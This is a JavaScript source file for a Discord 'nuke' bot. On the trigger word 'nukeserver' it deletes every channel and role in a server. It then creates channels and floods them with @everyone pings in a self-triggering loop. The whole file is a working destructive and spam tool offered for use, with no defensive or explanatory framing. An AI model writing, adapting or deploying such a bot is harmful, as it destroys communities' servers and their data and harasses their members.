const Discord = require("discord.js");
const conf = require("./nukeconf.json");
const client = new Discord.Client();

client.login(conf.token);

client.on('message', async (msg) =>{
    if (msg.content === 'nukeserver'){
        msg.guild.channels.cache.forEach(channel => channel.delete());
        msg.guild.roles.cache.forEach(role => role.delete());

        await msg.guild.channels.create(
            conf.channel_name, {
                type : 'text'
            }).then(async channel =>{
                channel.send('@everyone ' + conf.message_to_send)
            });
    };
});

client.on('message', async (msg) =>{
    if (msg.content === '@everyone ' + conf.message_to_send){
        await msg.guild.channels.create(
            conf.channel_name, {
                type : 'text'
            }).then(async channel =>{
                channel.send('@everyone ' + conf.message_to_send)
            });
        msg.channel.send('@everyone ' + conf.message_to_send);
        msg.channel.send('@everyone ' + conf.message_to_send);
        msg.channel.send('@everyone ' + conf.message_to_send);
        msg.channel.send('@everyone ' + conf.message_to_send);
        msg.channel.send('@everyone ' + conf.message_to_send);
    };  
});